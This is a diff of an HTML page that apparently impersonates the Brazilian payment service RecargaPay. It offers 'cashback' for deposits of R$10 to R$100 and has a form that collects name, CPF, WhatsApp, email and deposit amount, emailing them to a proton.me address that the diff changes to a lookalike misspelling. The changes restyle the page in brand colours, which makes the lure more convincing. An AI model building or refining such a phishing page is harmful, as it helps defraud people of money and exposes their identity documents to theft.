@@ -6,90 +6,132 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>RecargaPay Cashback</title>
   <style>
+    :root {
+      --rp-blue: #116ED2;
+      --rp-indigo: #6610f2;
+      --rp-purple: #6f42c1;
+      --rp-pink: #D61C45;
+      --rp-red: #dc3545;
+      --rp-orange: #F05A02;
+      --rp-yellow: #F4A203;
+      --rp-green: #017E50;
+      --rp-teal: #20c997;
+      --rp-cyan: #2593D0;
+      --rp-black: #000;
+      --rp-white: #fff;
+      --rp-gray: #5E707A;
+      --rp-gray-dark: #334149;
+      --rp-gray-100: #F2F5F6;
+      --rp-gray-200: #DCE2E6;
+      --rp-gray-300: #C4CED4;
+      --rp-gray-400: #A0AFB8;
+      --rp-gray-500: #7C8E98;
+      --rp-gray-600: #5E707A;
+      --rp-gray-700: #42535C;
+      --rp-gray-800: #334149;
+      --rp-gray-900: #212A2F;
+      --rp-primary: #F05A02;
+      --rp-secondary: #116ED2;
+      --rp-success: #017E50;
+      --rp-info: #116ED2;
+      --rp-warning: #F4A203;
+      --rp-danger: #D61C45;
+      --rp-light: #F2F5F6;
+      --rp-dark: #212A2F;
+    }
+
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #e6f2ff;
-      color: #222;
+      background: var(--rp-secondary-bg-subtle, #cfe2f6);
+      color: var(--rp-dark);
     }
     header {
-      text-align: center;
-      background: white;
-      padding: 40px 0 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 0;
+      background: var(--rp-white);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
-    .logo-img {
-      max-width: 280px;
+    .logo img {
+      width: 240px;
       height: auto;
     }
     .container {
-      max-width: 600px;
-      margin: 30px auto;
+      max-width: 700px;
+      margin: 40px auto;
       text-align: center;
+      background-color: var(--rp-light);
+      border-radius: 12px;
+      padding: 40px 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
     h1 {
       font-size: 24px;
-      color: #004aad;
+      color: var(--rp-secondary);
+      margin-bottom: 30px;
     }
     .btn {
-      background-color: #ff9900;
-      color: white;
+      background-color: var(--rp-orange);
+      color: var(--rp-white);
       padding: 15px 25px;
-      margin: 15px 10px;
-      border-radius: 10px;
-      text-decoration: none;
-      display: inline-block;
+      margin: 10px;
+      border: none;
+      border-radius: 8px;
       font-size: 18px;
+      cursor: pointer;
       transition: 0.3s;
     }
     .btn:hover {
-      background-color: #cc7a00;
+      background-color: #c74b00;
     }
     input[type="text"], input[type="email"] {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
-      border: 1px solid #ccc;
+      border: 1px solid var(--rp-gray-300);
       border-radius: 6px;
     }
     form {
-      margin-top: 20px;
+      margin-top: 30px;
     }
     footer {
       text-align: center;
       padding: 30px 20px;
-      background-color: #f0f0f0;
-      color: #555;
+      background-color: var(--rp-gray-100);
+      color: var(--rp-gray-700);
       font-size: 13px;
     }
     footer a {
-      color: #004aad;
+      color: var(--rp-secondary);
       text-decoration: none;
     }
   </style>
 </head>
 <body>
   <header>
-    <img src="logo.png" alt="Logo RecargaPay" class="logo-img">
+    <div class="logo">
+      <img src="logo.png" alt="RecargaPay Logo">
+    </div>
   </header>
 
   <div class="container">
-    <a class="btn" href="#">Depositar R$10</a>
-    <a class="btn" href="#">Depositar R$25</a>
-    <a class="btn" href="#">Depositar R$50</a>
-    <a class="btn" href="#">Depositar R$100</a>
-    <a class="btn" href="#cadastro">Cadastrar CPF e Receber Cashback</a>
+    <h1>Escolha um valor ou cadastre-se para receber cashback</h1>
+    <button class="btn">Depositar R$10</button>
+    <button class="btn">Depositar R$25</button>
+    <button class="btn">Depositar R$50</button>
+    <button class="btn">Depositar R$100</button>
+    <button class="btn">Cadastrar CPF e Receber Cashback</button>
 
-    <div id="cadastro">
-      <h1>Cadastro para Cashback</h1>
-      <form action="mailto:recargapay@proton.me" method="post" enctype="text/plain">
-        <input type="text" name="Nome" placeholder="Nome completo" required><br>
-        <input type="text" name="CPF" placeholder="CPF" required><br>
-        <input type="text" name="WhatsApp" placeholder="WhatsApp" required><br>
-        <input type="email" name="Email" placeholder="E-mail" required><br>
-        <input type="text" name="Valor" placeholder="Valor depositado (ex: R$50,00)" required><br>
-        <input type="submit" class="btn" value="Enviar dados e solicitar cashback">
-      </form>
-    </div>
+    <form action="mailto:recargaapay@proton.me" method="post" enctype="text/plain">
+      <input type="text" name="Nome" placeholder="Nome completo" required>
+      <input type="text" name="CPF" placeholder="CPF" required>
+      <input type="text" name="WhatsApp" placeholder="WhatsApp" required>
+      <input type="email" name="Email" placeholder="E-mail" required>
+      <input type="text" name="Valor" placeholder="Valor depositado (ex: R$50,00)" required>
+      <input type="submit" class="btn" value="Enviar dados e solicitar cashback">
+    </form>
   </div>
 
   <footer>
